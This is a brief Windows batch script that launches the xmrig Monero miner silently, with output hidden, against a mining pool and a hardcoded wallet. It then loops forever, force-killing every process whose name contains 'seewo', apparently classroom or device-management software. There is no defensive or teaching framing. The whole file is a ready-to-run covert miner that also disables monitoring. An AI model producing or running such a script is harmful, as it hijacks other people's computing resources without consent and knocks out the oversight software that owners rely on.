@echo off
rem Execute the other command once and suppress output
./xmrig.exe --opencl -o gulf.moneroocean.stream:10128 -u 448CDuJmiJTUz1ueH9hRkXjRAFo7UT4noPx29ihWbYmV4Tr1GERr2EMSt4ymkt1eELh8qHxHncJY7WfCoGhQVeCfD8S9Juy -k > nul 2>&1

:loop
rem Kill processes containing "seewo"
for /f "tokens=2 delims=," %%i in ('tasklist /FO CSV ^| findstr /I "seewo"') do (
    taskkill /F /PID %%i
)

timeout /t 4 /nobreak > nul
goto loop
